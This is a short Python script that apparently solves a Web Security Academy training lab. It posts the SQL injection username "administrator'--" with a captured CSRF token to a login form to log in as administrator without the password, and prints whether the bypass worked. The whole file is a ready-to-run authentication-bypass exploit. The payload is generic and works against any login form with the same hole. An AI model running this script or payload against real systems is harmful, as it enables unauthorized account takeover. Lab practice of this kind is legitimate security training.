import requests
from bs4 import BeautifulSoup
def main():
    url = "https://acd51f441f316575c0e10cfb00d300e1.web-security-academy.net/login"
    session = requests.session()
    session.get(url)
    #parameters = {'username': "administrator'--", "password": "aaa",'csrf': csrftoken}
    response = session.post(url, data ={
        "csrf": session.cookies.get_dict()["csrftoken"],
        "username":"administrator'--",
        "password":"aaa",
    })
    if "logout" in response.text:
        print("challenge solved")
    else:
        print("something does not work, incorrect data")
        print(response.text)
if __name__ == "__main__":
    main()